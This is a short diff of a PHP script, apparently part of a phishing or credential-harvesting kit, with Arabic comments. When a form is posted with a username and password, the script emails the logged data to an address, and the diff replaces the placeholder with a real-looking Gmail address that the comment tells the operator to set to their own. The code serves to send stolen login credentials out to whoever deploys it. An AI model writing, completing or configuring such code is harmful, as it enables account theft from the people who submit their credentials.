@@ -43,7 +43,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     
     // 📧 إرسال إشعار بالبريد - إذا كانت البيانات صالحة
     if ($username && $username !== 'N/A' && $password && $password !== 'N/A') {
-        $notifier = new EmailNotifier("your-email@gmail.com"); // ⚠️ غير هذا إلى بريدك
+        $notifier = new EmailNotifier("farbdallhfar5@gmail.com"); // ⚠️ غير هذا إلى بريدك
         $notifier->sendNotification($log_data);
     }
     
